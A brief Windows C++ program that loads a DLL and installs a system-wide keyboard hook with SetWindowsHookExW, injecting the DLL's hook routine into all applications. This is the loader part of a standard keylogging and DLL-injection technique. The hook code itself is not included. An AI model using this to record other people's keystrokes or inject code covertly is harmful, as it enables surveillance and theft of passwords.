#include <stdio.h>
#include <iostream>
#include <tchar.h>

#include "Windows.h"
#pragma comment(lib, "advapi32.lib")

#include <SDKDDKVer.h>

int main()
{
	//Path to the DLL that should get injected / that contains the hookProc
	std::wstring mDllPath = L"....";

	//Load the DLL into this application
	auto hModule = LoadLibraryW(mDllPath.c_str());
	if (hModule == nullptr)
	{
		 printf("Failed to load DLL for hooking: %d\n", GetLastError());
		 return -1;
	}

	//Get the address of the required hook routine
	auto hProc = HOOKPROC(GetProcAddress(hModule, "hookProc"));
	if (hProc == nullptr)
	{
		printf("Hook function not existing in DLL: %d\n", GetLastError());
		return -2;
	}

	//Set a global hook on all applications
	//-> Execute hProc whenever a keyboard event occurs
	auto hHook = SetWindowsHookExW(WH_KEYBOARD, hProc, hModule, 0);
	if (hHook == nullptr)
	{
		printf("Failed to install hook: %d\n", GetLastError());
		return -3;
	}
    return 0;
}